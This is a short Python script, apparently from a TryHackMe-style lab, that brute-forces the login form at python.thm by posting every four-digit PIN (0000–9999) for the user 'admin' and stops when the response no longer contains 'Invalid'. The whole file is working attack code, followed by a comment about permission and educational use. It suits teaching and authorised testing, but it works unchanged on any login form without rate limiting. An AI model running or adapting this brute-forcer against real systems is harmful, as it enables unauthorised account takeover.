import requests

url = "http://python.thm/labs/lab1/index.php"
username = "admin"

# Generating 4-digit numeric passwords (0000 to 9999)
password_list = [str(i).zfill(4) for i in range(10000)]

def brute_force():
    for password in password_list:
        data = {
            "username": username,
            "password": password
        }
        response = requests.post(url, data=data)
        
        if "Invalid" not in response.text:
            print(f"[+] Found valid credentials: {username}:{password}")
            break
        else:
            print(f"[-] Attempt with {password}")

brute_force()
# Note: Ensure that you have permission to perform brute force attacks on the target system.
# This script is for educational purposes only and should not be used for malicious intent.